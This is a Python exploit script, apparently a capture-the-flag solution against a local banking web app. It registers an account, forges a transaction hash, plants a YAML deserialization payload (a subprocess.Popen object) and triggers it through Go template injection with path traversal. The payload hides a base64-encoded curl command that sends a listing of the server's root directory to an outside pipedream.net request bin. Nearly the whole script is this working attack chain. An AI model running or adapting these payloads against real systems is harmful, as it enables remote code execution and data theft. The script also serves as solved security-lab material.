import time
import requests
from bs4 import BeautifulSoup
import re
import hashlib

BASE_URL = "http://localhost:3000"


s = requests.Session()

creds = {"username": "aaaaaaaaaaaaaaaaaaaaaaaar", "password": "random_password"}
s.post(BASE_URL + "/register", data=creds)

resp = s.post(
    BASE_URL + "/login",
    data=creds,
    allow_redirects=False,
)


s.cookies["session_id"] = resp.cookies["session_id"]

transaction_info = {
    "operation": "deposit",
    "amount": "10000.00",
}


final_text = ""
for i in range(10):
    resp = s.post(BASE_URL + "/account", data=transaction_info)
    if resp.status_code == 200:
        print("[+] Added a new transaction")

resp = s.get(BASE_URL + "/account")

final_text = resp.text

template = """- sender: ""
  username: ""
  balance_before: %s
  balance_after: %s
  description: deposit%s
  transaction_details:
    from: go-get-it
    result: success
"""


def isDesc(x):
    return x.text.find("strong") is not None and x.text.find("Description:") is not None


def extract_desc(html):
    descriptions = []
    soup = BeautifulSoup(html, "html.parser")
    description_tag = soup.find_all("p")

    for desc_tag in description_tag:
        text = desc_tag.get_text()

        if "Description:" in text:
            match = re.search("deposit(.*)", text)
            if match:
                description = match.group(1).strip().strip("|")
                descriptions.append(description)
    return descriptions


def mimick_yaml(descriptions):
    current_balance = 100000
    transactions = ""

    for i in range(len(descriptions)):
        transactions += template % (
            current_balance - 10000,
            current_balance,
            descriptions[i],
        )
        current_balance -= 10000
        if i > 8:
            break
    return transactions


output = mimick_yaml(extract_desc(final_text))

# # SHA256 of transactions
HASH = hashlib.sha256(output.encode("utf-8")).hexdigest()

print(HASH)

PAYLOAD = """!!python/object/apply:subprocess.Popen
- !!python/tuple
  - python
  - -c
  - "__import__('os').system(str(__import__('base64').b64decode('Y3VybCAiaHR0cHM6Ly9lbm9xaDExMHc0eW4ueC5waXBlZHJlYW0ubmV0L2BscyAvIHwgYmFzZTY0IC13MCBgIg==').decode()))" """

index = 0
for i in range(1000):
    resp = s.get(BASE_URL + "/transactions/view/" + str(i))
    if resp.status_code == 200:
        index = i
        break
print("heere")

resp = s.post(
    BASE_URL + "/user/financial-note/new", data={"note": PAYLOAD, "title": HASH}
)

while True:
    resp = s.get(
        BASE_URL + "/transactions/view/dev/" + str(index),
        params={
            "id": "1",
            "for": '{{.DoesPartyExist "TO:http://127.0.0.1:3000/user/../../../../../../../../financial-note/view/HASH"}}'.replace(
                "HASH", HASH
            ),
        },
    )

    time.sleep(1)
